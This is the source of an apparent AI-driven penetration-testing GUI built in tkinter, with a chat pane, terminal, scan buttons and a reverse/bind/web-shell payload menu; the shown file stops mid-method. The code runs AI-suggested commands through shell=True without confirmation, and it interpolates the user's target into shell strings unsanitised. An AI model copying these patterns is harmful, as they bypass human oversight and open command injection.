#!/usr/bin/env python3
"""
PentestGPT Ultimate - Comprehensive AI Penetration Testing Assistant
Features: Chatbot UI, Terminal Integration, All Pentesting Tools
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext, font, simpledialog
import threading
import subprocess
import sys
import os
import json
import time
import re
import queue
from datetime import datetime
from pathlib import Path
import hashlib
import base64

# Add src to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Try to import spaCy for NLP processing
try:
    import spacy
    try:
        nlp = spacy.load("en_core_web_sm")
        SPACY_AVAILABLE = True
    except:
        SPACY_AVAILABLE = False
        print("spaCy model not loaded, using basic NLP")
except ImportError:
    SPACY_AVAILABLE = False
    print("spaCy not available, using pattern matching only")

class UltimatePentestGUI:
    """Ultimate ChatGPT-style interface for AI-driven penetration testing"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("üîí PentestGPT Ultimate - AI Penetration Testing Suite")
        self.root.geometry("1600x900")
        
        # Set icon if available
        try:
            icon_path = Path(__file__).parent / "assets" / "icon.png"
            if icon_path.exists():
                self.root.iconphoto(True, tk.PhotoImage(file=str(icon_path)))
        except:
            pass
        
        # Apply modern dark theme
        self.setup_dark_theme()
        
        # Variables
        self.uploaded_files = []
        self.chat_messages = []
        self.command_history = []
        self.running_processes = []
        self.stop_requested = False
        self.output_queue = queue.Queue()
        self.current_target = None
        self.scan_results = {}
        self.ai_context = []
        
        # Tool availability cache
        self.available_tools = {}
        
        # Setup UI
        self.setup_ui()
        
        # Initialize components
        self.initialize_components()
        
        # Start output processor
        self.process_output()
        
        # Center window
        self.center_window()
        
        # Show welcome message
        self.show_welcome_message()
        
    def setup_dark_theme(self):
        """Setup professional dark theme with improved colors"""
        self.colors = {
            'bg_primary': '#1a1a2e',
            'bg_secondary': '#16213e',
            'bg_tertiary': '#0f3460',
            'bg_input': '#1e3a5f',
            'text_primary': '#ffffff',
            'text_secondary': '#e8e8e8',
            'text_muted': '#a0a0a0',
            'accent': '#00d4ff',
            'accent_hover': '#00a8cc',
            'success': '#4ade80',
            'warning': '#fbbf24',
            'error': '#ef4444',
            'info': '#60a5fa',
            'user_msg': '#2563eb',
            'ai_msg': '#374151',
            'border': '#4a5568',
            'code_bg': '#1f2937'
        }
        
        # Configure root
        self.root.configure(bg=self.colors['bg_primary'])
        
        # Configure ttk style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configure widgets
        self.style.configure('Dark.TFrame', background=self.colors['bg_primary'])
        self.style.configure('Secondary.TFrame', background=self.colors['bg_secondary'])
        self.style.configure('Dark.TLabel', background=self.colors['bg_primary'], 
                           foreground=self.colors['text_primary'])
        self.style.configure('Dark.TButton', 
                           background=self.colors['accent'],
                           foreground=self.colors['text_primary'],
                           borderwidth=0,
                           focuscolor='none',
                           relief='flat')
        self.style.map('Dark.TButton',
                      background=[('active', self.colors['accent_hover']),
                                ('pressed', self.colors['bg_tertiary'])])
        
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
    def setup_ui(self):
        """Setup the comprehensive UI"""
        # Main container
        main_container = ttk.Frame(self.root, style='Dark.TFrame')
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Top Header
        self.create_header(main_container)
        
        # Status Bar
        self.create_status_bar(main_container)
        
        # Main content with panes
        content_pane = ttk.PanedWindow(main_container, orient=tk.HORIZONTAL)
        content_pane.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Left Panel - Chat Interface
        left_panel = ttk.Frame(content_pane, style='Secondary.TFrame')
        content_pane.add(left_panel, weight=1)
        
        self.create_chat_interface(left_panel)
        
        # Right Panel - Terminal & Tools
        right_panel = ttk.Frame(content_pane, style='Secondary.TFrame')
        content_pane.add(right_panel, weight=1)
        
        self.create_terminal_interface(right_panel)
        
        # Bottom Panel - Quick Actions
        self.create_quick_actions(main_container)
        
    def create_header(self, parent):
        """Create professional header with branding"""
        header_frame = tk.Frame(parent, bg=self.colors['bg_tertiary'], height=70)
        header_frame.pack(fill=tk.X)
        header_frame.pack_propagate(False)
        
        # Left side - Logo and title
        left_frame = tk.Frame(header_frame, bg=self.colors['bg_tertiary'])
        left_frame.pack(side=tk.LEFT, padx=20, pady=10)
        
        # Logo
        logo_label = tk.Label(left_frame, text="üîí", font=('Arial', 28),
                            bg=self.colors['bg_tertiary'])
        logo_label.pack(side=tk.LEFT, padx=(0, 15))
        
        # Title and subtitle
        title_frame = tk.Frame(left_frame, bg=self.colors['bg_tertiary'])
        title_frame.pack(side=tk.LEFT)
        
        title = tk.Label(title_frame, text="PentestGPT Ultimate",
                        font=('Arial', 22, 'bold'),
                        bg=self.colors['bg_tertiary'],
                        fg=self.colors['accent'])
        title.pack(anchor='w')
        
        subtitle = tk.Label(title_frame, text="AI-Powered Penetration Testing Suite",
                          font=('Arial', 12),
                          bg=self.colors['bg_tertiary'],
                          fg=self.colors['text_muted'])
        subtitle.pack(anchor='w')
        
        # Right side - Target & Status
        right_frame = tk.Frame(header_frame, bg=self.colors['bg_tertiary'])
        right_frame.pack(side=tk.RIGHT, padx=20, pady=10)
        
        # Target input
        target_frame = tk.Frame(right_frame, bg=self.colors['bg_tertiary'])
        target_frame.pack(side=tk.LEFT, padx=(0, 20))
        
        tk.Label(target_frame, text="Target:",
                font=('Arial', 11),
                bg=self.colors['bg_tertiary'],
                fg=self.colors['text_secondary']).pack(side=tk.LEFT, padx=(0, 5))
        
        self.target_entry = tk.Entry(target_frame, width=30,
                                    bg=self.colors['bg_input'],
                                    fg=self.colors['text_primary'],
                                    insertbackground=self.colors['accent'],
                                    font=('Arial', 11))
        self.target_entry.pack(side=tk.LEFT)
        self.target_entry.insert(0, "Enter target IP/domain")
        self.target_entry.bind('<FocusIn>', lambda e: self.clear_placeholder(e, "Enter target IP/domain"))
        self.target_entry.bind('<FocusOut>', lambda e: self.restore_placeholder(e, "Enter target IP/domain"))
        
        # Set target button
        set_btn = tk.Button(target_frame, text="Set",
                          bg=self.colors['accent'],
                          fg=self.colors['text_primary'],
                          relief=tk.FLAT,
                          padx=15,
                          command=self.set_target)
        set_btn.pack(side=tk.LEFT, padx=(5, 0))
        
    def create_status_bar(self, parent):
        """Create status bar with indicators"""
        status_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], height=30)
        status_frame.pack(fill=tk.X)
        status_frame.pack_propagate(False)
        
        # Status indicators
        self.status_indicators = {}
        
        indicators = [
            ("AI", self.colors['success']),
            ("Scanner", self.colors['text_muted']),
            ("Exploit", self.colors['text_muted']),
            ("Network", self.colors['success'])
        ]
        
        for name, color in indicators:
            indicator_frame = tk.Frame(status_frame, bg=self.colors['bg_secondary'])
            indicator_frame.pack(side=tk.LEFT, padx=10)
            
            dot = tk.Label(indicator_frame, text="‚óè", 
                         font=('Arial', 10),
                         bg=self.colors['bg_secondary'],
                         fg=color)
            dot.pack(side=tk.LEFT)
            
            label = tk.Label(indicator_frame, text=name,
                           font=('Arial', 10),
                           bg=self.colors['bg_secondary'],
                           fg=self.colors['text_muted'])
            label.pack(side=tk.LEFT, padx=(3, 0))
            
            self.status_indicators[name] = dot
        
        # Right side - current operation
        self.operation_label = tk.Label(status_frame, text="Ready",
                                      font=('Arial', 10),
                                      bg=self.colors['bg_secondary'],
                                      fg=self.colors['text_secondary'])
        self.operation_label.pack(side=tk.RIGHT, padx=20)
        
    def create_chat_interface(self, parent):
        """Create the chat interface panel"""
        # Chat header
        chat_header = tk.Frame(parent, bg=self.colors['bg_tertiary'], height=45)
        chat_header.pack(fill=tk.X)
        chat_header.pack_propagate(False)
        
        tk.Label(chat_header, text="üí¨ AI Assistant",
                font=('Arial', 14, 'bold'),
                bg=self.colors['bg_tertiary'],
                fg=self.colors['text_primary']).pack(side=tk.LEFT, padx=15, pady=10)
        
        # Clear chat button
        clear_btn = tk.Button(chat_header, text="Clear",
                            bg=self.colors['bg_primary'],
                            fg=self.colors['text_muted'],
                            relief=tk.FLAT,
                            command=self.clear_chat)
        clear_btn.pack(side=tk.RIGHT, padx=15)
        
        # Chat display area
        chat_frame = tk.Frame(parent, bg=self.colors['bg_primary'])
        chat_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create scrolled text for chat
        self.chat_display = scrolledtext.ScrolledText(
            chat_frame,
            wrap=tk.WORD,
            bg=self.colors['bg_primary'],
            fg=self.colors['text_primary'],
            insertbackground=self.colors['accent'],
            font=('Consolas', 11),
            relief=tk.FLAT,
            padx=10,
            pady=10
        )
        self.chat_display.pack(fill=tk.BOTH, expand=True)
        
        # Configure tags for different message types
        self.chat_display.tag_configure('user', foreground=self.colors['accent'])
        self.chat_display.tag_configure('ai', foreground=self.colors['text_secondary'])
        self.chat_display.tag_configure('system', foreground=self.colors['warning'])
        self.chat_display.tag_configure('error', foreground=self.colors['error'])
        self.chat_display.tag_configure('success', foreground=self.colors['success'])
        self.chat_display.tag_configure('code', 
                                       background=self.colors['code_bg'],
                                       font=('Consolas', 10))
        
        # Input area
        input_frame = tk.Frame(parent, bg=self.colors['bg_secondary'])
        input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # File upload button
        upload_btn = tk.Button(input_frame, text="üìé",
                             font=('Arial', 16),
                             bg=self.colors['bg_secondary'],
                             fg=self.colors['text_muted'],
                             relief=tk.FLAT,
                             command=self.upload_file)
        upload_btn.pack(side=tk.LEFT, padx=(10, 5))
        
        # Input entry
        self.chat_input = tk.Entry(input_frame,
                                  bg=self.colors['bg_input'],
                                  fg=self.colors['text_primary'],
                                  insertbackground=self.colors['accent'],
                                  font=('Arial', 12),
                                  relief=tk.FLAT)
        self.chat_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.chat_input.bind('<Return>', self.send_message)
        self.chat_input.bind('<Up>', self.previous_command)
        self.chat_input.bind('<Down>', self.next_command)
        
        # Send button
        send_btn = tk.Button(input_frame, text="Send",
                           bg=self.colors['accent'],
                           fg=self.colors['text_primary'],
                           relief=tk.FLAT,
                           padx=20,
                           command=self.send_message)
        send_btn.pack(side=tk.RIGHT, padx=(5, 10))
        
    def create_terminal_interface(self, parent):
        """Create the terminal and tools panel"""
        # Create notebook for tabs
        self.tool_notebook = ttk.Notebook(parent)
        self.tool_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Terminal tab
        terminal_frame = ttk.Frame(self.tool_notebook, style='Dark.TFrame')
        self.tool_notebook.add(terminal_frame, text='üñ•Ô∏è Terminal')
        
        self.create_terminal_tab(terminal_frame)
        
        # Scan Results tab
        results_frame = ttk.Frame(self.tool_notebook, style='Dark.TFrame')
        self.tool_notebook.add(results_frame, text='üìä Scan Results')
        
        self.create_results_tab(results_frame)
        
        # Vulnerabilities tab
        vuln_frame = ttk.Frame(self.tool_notebook, style='Dark.TFrame')
        self.tool_notebook.add(vuln_frame, text='üîç Vulnerabilities')
        
        self.create_vulnerabilities_tab(vuln_frame)
        
        # Exploits tab
        exploit_frame = ttk.Frame(self.tool_notebook, style='Dark.TFrame')
        self.tool_notebook.add(exploit_frame, text='üí£ Exploits')
        
        self.create_exploits_tab(exploit_frame)
        
        # Reports tab
        reports_frame = ttk.Frame(self.tool_notebook, style='Dark.TFrame')
        self.tool_notebook.add(reports_frame, text='üìù Reports')
        
        self.create_reports_tab(reports_frame)
        
    def create_terminal_tab(self, parent):
        """Create terminal output tab"""
        # Terminal header with controls
        terminal_header = tk.Frame(parent, bg=self.colors['bg_secondary'], height=40)
        terminal_header.pack(fill=tk.X)
        terminal_header.pack_propagate(False)
        
        tk.Label(terminal_header, text="Terminal Output",
                font=('Arial', 12, 'bold'),
                bg=self.colors['bg_secondary'],
                fg=self.colors['text_primary']).pack(side=tk.LEFT, padx=10)
        
        # Terminal controls
        control_frame = tk.Frame(terminal_header, bg=self.colors['bg_secondary'])
        control_frame.pack(side=tk.RIGHT, padx=10)
        
        clear_terminal_btn = tk.Button(control_frame, text="Clear",
                                      bg=self.colors['bg_primary'],
                                      fg=self.colors['text_muted'],
                                      relief=tk.FLAT,
                                      command=self.clear_terminal)
        clear_terminal_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(control_frame, text="Stop",
                                 bg=self.colors['error'],
                                 fg=self.colors['text_primary'],
                                 relief=tk.FLAT,
                                 command=self.stop_execution,
                                 state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Terminal output
        self.terminal_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            bg='#0c0c0c',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Consolas', 10),
            relief=tk.FLAT,
            padx=10,
            pady=10
        )
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure tags for terminal colors
        self.terminal_output.tag_configure('error', foreground='#ff4444')
        self.terminal_output.tag_configure('warning', foreground='#ffaa00')
        self.terminal_output.tag_configure('success', foreground='#44ff44')
        self.terminal_output.tag_configure('info', foreground='#4444ff')
        
    def create_results_tab(self, parent):
        """Create scan results tab"""
        # Results tree view
        columns = ('Type', 'Target', 'Status', 'Details')
        self.results_tree = ttk.Treeview(parent, columns=columns, show='tree headings')
        
        # Configure columns
        self.results_tree.column('#0', width=50)
        self.results_tree.column('Type', width=100)
        self.results_tree.column('Target', width=150)
        self.results_tree.column('Status', width=100)
        self.results_tree.column('Details', width=300)
        
        # Configure headings
        self.results_tree.heading('#0', text='ID')
        self.results_tree.heading('Type', text='Type')
        self.results_tree.heading('Target', text='Target')
        self.results_tree.heading('Status', text='Status')
        self.results_tree.heading('Details', text='Details')
        
        # Add scrollbar
        results_scroll = ttk.Scrollbar(parent, orient='vertical', command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=results_scroll.set)
        
        self.results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        results_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
    def create_vulnerabilities_tab(self, parent):
        """Create vulnerabilities tab"""
        # Vulnerability list
        vuln_frame = tk.Frame(parent, bg=self.colors['bg_primary'])
        vuln_frame.pack(fill=tk.BOTH, expand=True)
        
        # Filters
        filter_frame = tk.Frame(vuln_frame, bg=self.colors['bg_secondary'], height=40)
        filter_frame.pack(fill=tk.X)
        filter_frame.pack_propagate(False)
        
        tk.Label(filter_frame, text="Severity:",
                font=('Arial', 11),
                bg=self.colors['bg_secondary'],
                fg=self.colors['text_secondary']).pack(side=tk.LEFT, padx=10)
        
        severities = ['All', 'Critical', 'High', 'Medium', 'Low', 'Info']
        self.severity_filter = ttk.Combobox(filter_frame, values=severities, width=15)
        self.severity_filter.set('All')
        self.severity_filter.pack(side=tk.LEFT, padx=5)
        
        # Vulnerability list
        self.vuln_listbox = tk.Listbox(vuln_frame,
                                      bg=self.colors['bg_primary'],
                                      fg=self.colors['text_primary'],
                                      selectbackground=self.colors['accent'])
        self.vuln_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def create_exploits_tab(self, parent):
        """Create exploits tab"""
        # Exploit management
        exploit_frame = tk.Frame(parent, bg=self.colors['bg_primary'])
        exploit_frame.pack(fill=tk.BOTH, expand=True)
        
        # Payload generator
        payload_frame = tk.LabelFrame(exploit_frame, text="Payload Generator",
                                    bg=self.colors['bg_primary'],
                                    fg=self.colors['text_primary'])
        payload_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Payload options
        options_frame = tk.Frame(payload_frame, bg=self.colors['bg_primary'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(options_frame, text="Type:",
                bg=self.colors['bg_primary'],
                fg=self.colors['text_secondary']).grid(row=0, column=0, padx=5, pady=5)
        
        self.payload_type = ttk.Combobox(options_frame, 
                                        values=['reverse_shell', 'bind_shell', 'web_shell'],
                                        width=20)
        self.payload_type.set('reverse_shell')
        self.payload_type.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(options_frame, text="Platform:",
                bg=self.colors['bg_primary'],
                fg=self.colors['text_secondary']).grid(row=0, column=2, padx=5, pady=5)
        
        self.payload_platform = ttk.Combobox(options_frame,
                                            values=['windows', 'linux', 'web', 'android'],
                                            width=20)
        self.payload_platform.set('linux')
        self.payload_platform.grid(row=0, column=3, padx=5, pady=5)
        
        # Generate button
        generate_btn = tk.Button(payload_frame, text="Generate Payload",
                               bg=self.colors['accent'],
                               fg=self.colors['text_primary'],
                               relief=tk.FLAT,
                               padx=20,
                               command=self.generate_payload)
        generate_btn.pack(pady=10)
        
        # Exploit list
        self.exploit_listbox = tk.Listbox(exploit_frame,
                                         bg=self.colors['bg_primary'],
                                         fg=self.colors['text_primary'],
                                         selectbackground=self.colors['accent'])
        self.exploit_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def create_reports_tab(self, parent):
        """Create reports tab"""
        # Report generation
        report_frame = tk.Frame(parent, bg=self.colors['bg_primary'])
        report_frame.pack(fill=tk.BOTH, expand=True)
        
        # Report options
        options_frame = tk.LabelFrame(report_frame, text="Report Options",
                                    bg=self.colors['bg_primary'],
                                    fg=self.colors['text_primary'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(options_frame, text="Format:",
                bg=self.colors['bg_primary'],
                fg=self.colors['text_secondary']).pack(side=tk.LEFT, padx=10)
        
        self.report_format = ttk.Combobox(options_frame,
                                         values=['HTML', 'PDF', 'Markdown', 'JSON'],
                                         width=15)
        self.report_format.set('HTML')
        self.report_format.pack(side=tk.LEFT, padx=5)
        
        generate_report_btn = tk.Button(options_frame, text="Generate Report",
                                       bg=self.colors['accent'],
                                       fg=self.colors['text_primary'],
                                       relief=tk.FLAT,
                                       padx=20,
                                       command=self.generate_report)
        generate_report_btn.pack(side=tk.LEFT, padx=20)
        
        # Report preview
        self.report_preview = scrolledtext.ScrolledText(
            report_frame,
            wrap=tk.WORD,
            bg=self.colors['bg_primary'],
            fg=self.colors['text_primary'],
            font=('Consolas', 10)
        )
        self.report_preview.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def create_quick_actions(self, parent):
        """Create quick actions panel"""
        actions_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], height=60)
        actions_frame.pack(fill=tk.X, side=tk.BOTTOM)
        actions_frame.pack_propagate(False)
        
        # Quick action buttons
        actions = [
            ("üí• Full Pentest", self.full_pentest),
            ("üîç Quick Scan", self.quick_scan),
            ("üåê Web Scan", self.web_scan),
            ("üì° Network Map", self.network_map),
            ("üõ°Ô∏è Vuln Scan", self.vulnerability_scan),
            ("üì± Mobile Test", self.mobile_test),
            ("‚òÅÔ∏è Cloud Assess", self.cloud_assess),
            ("üîê Crack Hash", self.crack_hash),
            ("üéØ Exploit", self.run_exploit)
        ]
        
        for text, command in actions:
            btn = tk.Button(actions_frame, text=text,
                          bg=self.colors['bg_tertiary'],
                          fg=self.colors['text_secondary'],
                          relief=tk.FLAT,
                          padx=15,
                          pady=10,
                          command=command)
            btn.pack(side=tk.LEFT, padx=5, pady=10)
            
    def initialize_components(self):
        """Initialize AI and tool components"""
        self.operation_label.config(text="Initializing AI components...")
        
        # Check available tools
        self.check_available_tools()
        
        # Initialize AI backend
        try:
            from src.chat_ai_backend import ChatAIBackend
            self.ai_backend = ChatAIBackend()
            self.update_status_indicator("AI", self.colors['success'])
        except Exception as e:
            print(f"AI backend initialization error: {e}")
            self.ai_backend = None
            self.update_status_indicator("AI", self.colors['error'])
        
        self.operation_label.config(text="Ready")
        
    def check_available_tools(self):
        """Check which pentesting tools are available"""
        tools = [
            'nmap', 'nikto', 'gobuster', 'sqlmap', 'metasploit',
            'hydra', 'john', 'hashcat', 'aircrack-ng', 'wifite'
        ]
        
        for tool in tools:
            self.available_tools[tool] = self.is_tool_available(tool)
            
    def is_tool_available(self, tool_name):
        """Check if a tool is available"""
        try:
            result = subprocess.run(['which', tool_name], 
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True,
                                  timeout=2)
            return result.returncode == 0
        except:
            return False
            
    def show_welcome_message(self):
        """Show welcome message in chat"""
        welcome = """üîí Welcome to PentestGPT Ultimate!

I'm your AI-powered penetration testing assistant. I can help you:
‚Ä¢ Perform network reconnaissance and scanning
‚Ä¢ Identify vulnerabilities in web applications
‚Ä¢ Generate custom payloads and exploits
‚Ä¢ Analyze mobile applications and APIs
‚Ä¢ Test cloud infrastructure security
‚Ä¢ Create comprehensive security reports

Type your commands in natural language or use $ for direct terminal commands.
Set your target using the field in the header to begin.

Available quick actions are shown at the bottom. Let's start testing!
"""
        self.add_chat_message(welcome, 'ai')
        
    def add_chat_message(self, message, message_type='user'):
        """Add message to chat display"""
        self.chat_display.config(state=tk.NORMAL)
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if message_type == 'user':
            self.chat_display.insert(tk.END, f"\n[{timestamp}] You: ", 'user')
            self.chat_display.insert(tk.END, message + "\n")
        elif message_type == 'ai':
            self.chat_display.insert(tk.END, f"\n[{timestamp}] AI: ", 'ai')
            self.chat_display.insert(tk.END, message + "\n")
        elif message_type == 'system':
            self.chat_display.insert(tk.END, f"\n[{timestamp}] System: ", 'system')
            self.chat_display.insert(tk.END, message + "\n")
        elif message_type == 'error':
            self.chat_display.insert(tk.END, f"\n[{timestamp}] Error: ", 'error')
            self.chat_display.insert(tk.END, message + "\n")
            
        self.chat_display.config(state=tk.DISABLED)
        self.chat_display.see(tk.END)
        
        # Store in history
        self.chat_messages.append({
            'timestamp': timestamp,
            'type': message_type,
            'message': message
        })
        
    def send_message(self, event=None):
        """Process and send user message"""
        message = self.chat_input.get().strip()
        if not message:
            return
            
        # Add to chat
        self.add_chat_message(message, 'user')
        
        # Store in command history
        self.command_history.append(message)
        
        # Clear input
        self.chat_input.delete(0, tk.END)
        
        # Process message in thread
        threading.Thread(target=self.process_message, args=(message,), daemon=True).start()
        
    def process_message(self, message):
        """Process user message and generate response"""
        try:
            # Check for direct terminal command
            if message.startswith('$'):
                command = message[1:].strip()
                self.execute_terminal_command(command)
                return
                
            # Use AI to process natural language
            if self.ai_backend and hasattr(self.ai_backend, 'process_query'):
                response = self.ai_backend.process_query(message, self.current_target)
                
                if response.get('type') == 'command':
                    # Execute suggested command
                    self.add_chat_message(f"Executing: {response['command']}", 'system')
                    self.execute_terminal_command(response['command'])
                elif response.get('type') == 'information':
                    # Display information
                    self.add_chat_message(response['content'], 'ai')
                else:
                    # General response
                    self.add_chat_message(response.get('content', 'Processing...'), 'ai')
            else:
                # Fallback pattern matching
                self.process_with_patterns(message)
                
        except Exception as e:
            self.add_chat_message(f"Error processing message: {str(e)}", 'error')
            
    def process_with_patterns(self, message):
        """Process message using pattern matching when AI is unavailable"""
        message_lower = message.lower()
        
        # Network scanning patterns
        if any(word in message_lower for word in ['scan', 'port', 'network', 'nmap']):
            if self.current_target:
                self.add_chat_message(f"Scanning {self.current_target}...", 'system')
                self.execute_terminal_command(f"nmap -sV {self.current_target}")
            else:
                self.add_chat_message("Please set a target first using the target field.", 'system')
                
        # Web scanning patterns
        elif any(word in message_lower for word in ['web', 'website', 'http', 'nikto']):
            if self.current_target:
                self.add_chat_message(f"Running web scan on {self.current_target}...", 'system')
                self.execute_terminal_command(f"nikto -h {self.current_target}")
            else:
                self.add_chat_message("Please set a target first.", 'system')
                
        # Vulnerability scanning
        elif any(word in message_lower for word in ['vulnerability', 'vuln', 'cve', 'exploit']):
            if self.current_target:
                self.add_chat_message(f"Checking vulnerabilities for {self.current_target}...", 'system')
                self.vulnerability_scan()
            else:
                self.add_chat_message("Please set a target first.", 'system')
                
        # Help patterns
        elif any(word in message_lower for word in ['help', 'how', 'what can']):
            self.show_help()
            
        else:
            self.add_chat_message("I can help you with scanning, vulnerability assessment, and exploitation. Try commands like 'scan network', 'test website', or use $ for direct terminal commands.", 'ai')
            
    def execute_terminal_command(self, command):
        """Execute command in terminal"""
        self.operation_label.config(text=f"Executing: {command[:30]}...")
        self.stop_btn.config(state=tk.NORMAL)
        self.stop_requested = False
        
        # Switch to terminal tab
        self.tool_notebook.select(0)
        
        # Add command to terminal
        self.terminal_output.insert(tk.END, f"\n$ {command}\n", 'success')
        self.terminal_output.see(tk.END)
        
        try:
            # Create process
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.running_processes.append(process)
            
            # Read output in real-time
            while True:
                if self.stop_requested:
                    process.terminate()
                    self.terminal_output.insert(tk.END, "\n[Process terminated by user]\n", 'warning')
                    break
                    
                output = process.stdout.readline()
                if output:
                    self.terminal_output.insert(tk.END, output)
                    self.terminal_output.see(tk.END)
                    self.root.update_idletasks()
                    
                if process.poll() is not None:
                    # Process finished
                    remaining = process.stdout.read()
                    if remaining:
                        self.terminal_output.insert(tk.END, remaining)
                    
                    errors = process.stderr.read()
                    if errors:
                        self.terminal_output.insert(tk.END, errors, 'error')
                    
                    break
                    
            self.running_processes.remove(process)
            
        except Exception as e:
            self.terminal_output.insert(tk.END, f"\nError: {str(e)}\n", 'error')
            
        finally:
            self.stop_btn.config(state=tk.DISABLED)
            self.operation_label.config(text="Ready")
            
    def stop_execution(self):
        """Stop current execution"""
        self.stop_requested = True
        for process in self.running_processes:
            try:
                process.terminate()
            except:
                pass
                
    def clear_chat(self):
        """Clear chat display"""
        self.chat_display.config(state=tk.NORMAL)
        self.chat_display.delete(1.0, tk.END)
        self.chat_display.config(state=tk.DISABLED)
        self.show_welcome_message()
        
    def clear_terminal(self):
        """Clear terminal output"""
        self.terminal_output.delete(1.0, tk.END)
        
    def set_target(self):
        """Set the current target"""
        target = self.target_entry.get().strip()
        if target and target != "Enter target IP/domain":
            self.current_target = target
            self.add_chat_message(f"Target set to: {target}", 'system')
            self.update_status_indicator("Network", self.colors['success'])
        else:
            messagebox.showwarning("Invalid Target", "Please enter a valid target IP or domain.")
            
    def upload_file(self):
        """Handle file upload"""
        file_path = filedialog.askopenfilename()
        if file_path:
            self.uploaded_files.append(file_path)
            filename = os.path.basename(file_path)
            self.add_chat_message(f"File uploaded: {filename}", 'system')
            
            # Analyze file based on type
            if filename.endswith('.apk'):
                self.add_chat_message("APK file detected. Use 'analyze apk' to scan it.", 'ai')
            elif filename.endswith(('.py', '.sh', '.ps1')):
                self.add_chat_message("Script file detected. I can analyze it for security issues.", 'ai')
                
    def update_status_indicator(self, name, color):
        """Update status indicator color"""
        if name in self.status_indicators:
            self.status_indicators[name].config(fg=color)
            
    def clear_placeholder(self, event, placeholder):
        """Clear placeholder text"""
        if event.widget.get() == placeholder:
            event.widget.delete(0, tk.END)
            
    def restore_placeholder(self, event, placeholder):
        """Restore placeholder text"""
        if not event.widget.get():
            event.widget.insert(0, placeholder)
            
    def previous_command(self, event):
        """Navigate to previous command in history"""
        # Implement command history navigation
        pass
        
    def next_command(self, event):
        """Navigate to next command in history"""
        # Implement command history navigation
        pass
        
    def process_output(self):
        """Process queued output"""
        try:
            while True:
                output = self.output_queue.get_nowait()
                if output:
                    self.terminal_output.insert(tk.END, output)
                    self.terminal_output.see(tk.END)
        except:
            pass
        finally:
            self.root.after(100, self.process_output)
            
    def full_pentest(self):
        """Run the full end-to-end pentest workflow."""
        if not self.current_target:
            messagebox.showinfo("No Target", "Please set a target first.")
            return

        self.add_chat_message(f"Starting full automated pentest on {self.current_target}...", 'system')
        
        # Run workflow in a separate thread to keep UI responsive
        threading.Thread(
            target=self._run_workflow_thread,
            daemon=True
        ).start()

    def _run_workflow_thread(self):
        """Helper to run the workflow in a thread."""
        from src.workflow_orchestrator import PentestWorkflow
        
        output_dir = Path('./reports')
        workflow = PentestWorkflow(self.current_target, output_dir, self.add_chat_message)
        workflow.run_full_pentest()
    
    # Quick action methods
    def quick_scan(self):
        """Perform quick network scan"""
        if self.current_target:
            self.add_chat_message(f"Starting quick scan of {self.current_target}...", 'system')
            self.execute_terminal_command(f"nmap -F {self.current_target}")
        else:
            messagebox.showinfo("No Target", "Please set a target first.")
            
    def web_scan(self):
        """Perform web application scan"""
        if self.current_target:
            self.add_chat_message(f"Starting web scan of {self.current_target}...", 'system')
            
            # Check available tools and run appropriate scan
            if self.available_tools.get('nikto'):
                self.execute_terminal_command(f"nikto -h http://{self.current_target}")
            elif self.available_tools.get('gobuster'):
                self.execute_terminal_command(f"gobuster dir -u http://{self.current_target} -w /usr/share/wordlists/dirb/common.txt")
            else:
                self.add_chat_message("No web scanning tools available. Install nikto or gobuster.", 'error')
        else:
            messagebox.showinfo("No Target", "Please set a target first.")
            
    def network_map(self):
        """Create network map"""
        if self.current_target:
            self.add_chat_message(f"Mapping network around {self.current_target}...", 'system')
            self.execute_terminal_command(f"nmap -sn {self.current_target}/24")
        else:
            # Scan local network
            self.add_chat_message("Mapping local network...", 'system')
            self.execute_terminal_command("nmap -sn 192.168.1.0/24")
            
    def vulnerability_scan(self):
        """Perform vulnerability scan"""
        if self.current_target:
            self.add_chat_message(f"Scanning for vulnerabilities on {self.current_target}...", 'system')
            self.execute_terminal_command(f"nmap -sV --script vuln {self.current_target}")
        else:
            messagebox.showinfo("No Target", "Please set a target first.")
            
    def mobile_test(self):
        """Test mobile application"""
        if self.uploaded_files:
            apk_files = [f for f in self.uploaded_files if f.endswith('.apk')]
            if apk_files:
                self.add_chat_message(f"Analyzing APK: {os.path.basename(apk_files[0])}", 'system')
                # Add APK analysis logic here
            else:
                self.add_chat_message("No APK files uploaded. Use the upload button to add an APK file.", 'system')
        else:
